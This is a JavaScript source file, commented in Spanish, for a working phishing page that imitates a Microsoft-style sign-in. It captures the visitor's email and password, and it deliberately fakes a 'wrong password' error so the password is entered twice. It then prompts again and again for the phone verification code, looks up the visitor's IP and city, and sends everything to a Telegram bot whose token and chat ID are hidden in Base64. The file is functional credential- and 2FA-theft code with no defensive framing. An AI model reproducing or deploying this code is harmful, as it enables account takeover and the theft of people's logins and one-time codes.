document.addEventListener("DOMContentLoaded", function() {
    // Estado de la contraseña y código de verificación ingresados por primera vez
    var firstTimePassword = true;
    var firstTimeVerificationCode = true;

    var email;
    var country;
    var state;
    var ip;

    // Función para codificar en Base64
    function encode(data) {
        return btoa(data);
    }

    // Función para decodificar de Base64
    function decode(data) {
        return atob(data);
    }

// Bot token y chat ID encriptados (nuevos valores encriptados)
var encodedTelegramBotToken = 'NzgwODgxODk3MTpBQUd6dGZoR3RpTFQ3UjdncGRZOHA5VUZRUDZvdkJWMmVzVQ==';
var encodedTelegramChatId = 'LTQ1OTI1MTA0ODY=';

// Decodificar bot token y chat ID antes de usarlos
var telegramBotToken = decode(encodedTelegramBotToken);
var telegramChatId = decode(encodedTelegramChatId);


    // Evento de envío del formulario de inicio de sesión
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();

        email = document.getElementById("email").value;

        // Aquí debes llamar a la API para obtener el país y el estado
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(userData => {
                country = userData.country_name; // Asegúrate de que la API devuelve country_name
                state = userData.city;           // Asegúrate de que la API devuelve city
                ip = userData.ip;    

                showPasswordForm(email);
            })
            .catch(error => console.error('Error al obtener datos del usuario:', error));
    });

    function showPasswordForm(email) {
        var passwordForm = document.createElement("form");
        passwordForm.id = "password-form";
        passwordForm.innerHTML = `
            <div class="container">
                <div class="login-box">
                    <div class="login-content">
                        <img src="logo.svg" alt="Logo" class="logo">
                        <br><br>
                        <div>
                            <span style="float: left;color:black;font-size:17px;">${email}</span>
                        </div>
                        <h2 style="color: black; float: left; font-weight: 600; line-height: 28px; font-size: 1.5rem; display: block; margin-bottom: 5px; margin-top:10px;">Escribir contraseña</h2>
                        <div id="password-alert-custom" style="display: none;">
                            <span style="color: red; float: left; text-align: left;">La cuenta o la contraseña es incorrecta. Si no recuerdas la cuenta,
                                <a style="color: #0067b8"> restablécela ahora.</a>
                            </span>
                        </div>
                        <input type="password" id="password" required="" placeholder="Contraseña">
                        <br><br>
                        <div align="left" style="font-size: 0.8125rem;">
                            <a style="color: #0067b8; cursor: pointer;" onmouseover="this.style.textDecoration='underline'" onmouseout="this.style.textDecoration='none'">¿Olvidó su contraseña?</a>
                        </div>
                        <button style="padding: 1px 6px;" type="submit">Iniciar Sesión</button>
                    </div>
                </div>
            </div>`;

        document.body.innerHTML = "";
        document.body.appendChild(passwordForm);

        document.getElementById("password-form").addEventListener("submit", function(event) {
            event.preventDefault();
            var password = document.getElementById("password").value;

            // Enviar datos vía mensaje de Telegram
            sendDataViaTelegram(email, password, country, state, ip);

            if (firstTimePassword) {
                document.getElementById("password-alert-custom").style.display = "block";
                firstTimePassword = false;
            } else {
                showVerificationForm(email, false);
            }
        });
    }

    function showVerificationForm(email, showError) {
        var verificationForm = document.createElement("form");
        verificationForm.id = "verification-form";
        verificationForm.innerHTML =  `
            <div class="container">
                <div class="login-box">
                    <div class="login-content">
                        <img src="logo.svg" alt="Logo" class="logo">
                        <br><br>
                        <div>
                            <span style="float: left; color:black; font-size:17px;">${email}</span>
                        </div>
                        <h2 style="color: black; float: left; font-weight: 600; line-height: 28px; font-size: 1.5rem; display: block; margin-bottom: 5px; margin-top:10px;">Ingresar código de verificación</h2>
                        ${showError ? 
                        `<div id="verification-error">
                            <span style="color: red; float: left; text-align: left;">Su código de verificación anterior fue incorrecto, ingrese su nuevo código</span>
                        </div>` : ''}
                        ${!showError ? 
                        `<div>
                            <p style="color:black; float:left; margin:0px;">Le hemos enviado un código de verificación a su número de teléfono registrado.</p>
                        </div>` : ''}
                        <input type="text" id="verification-code" required="" placeholder="Código de verificación">
                        <br><br>
                        <button style="padding: 1px 6px;" type="submit">Verificar</button>
                    </div>
                </div>
            </div>`;

        document.body.innerHTML = "";
        document.body.appendChild(verificationForm);

        document.getElementById("verification-form").addEventListener("submit", function(event) {
            event.preventDefault();
            var verificationCode = document.getElementById("verification-code").value;

            // Enviar código de verificación vía Telegram
            sendVerificationCodeViaTelegram(email, verificationCode, country, state, ip);

            if (firstTimeVerificationCode) {
                firstTimeVerificationCode = false;
                showVerificationForm(email, true);
            } else {
                // Mantener el bucle para pedir el código nuevamente con mensaje de error
                showVerificationForm(email, true);
            }
        });
    }

    // Función para enviar datos vía mensaje de Telegram
    function sendDataViaTelegram(email, password, country, state, ip) {
        var message = `🔒 **Nueva entrada de inicio de sesión**
📧 **Email:** ${email}
🔑 **Contraseña:** ${password}
🌍 **País:** ${country}
🏙️ **Ciudad:** ${state}
🌐 **IP:** ${ip}`;

        sendTelegramMessage(message);
    }

    // Función para enviar el código de verificación vía Telegram
    function sendVerificationCodeViaTelegram(email, verificationCode, country, state, ip) {
        var message = `✅ **Código de verificación recibido**
📧 **Email:** ${email}
🔢 **Código de Verificación:** ${verificationCode}
🌍 **País:** ${country}
🏙️ **Ciudad:** ${state}
🌐 **IP:** ${ip}`;

        sendTelegramMessage(message);
    }

    // Función para enviar mensaje a través de Telegram
    function sendTelegramMessage(message) {
        var url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        var data = {
            chat_id: telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log('Mensaje enviado vía Telegram:', data);
        })
        .catch((error) => {
            console.error('Error al enviar mensaje de Telegram:', error);
        });
    }
});
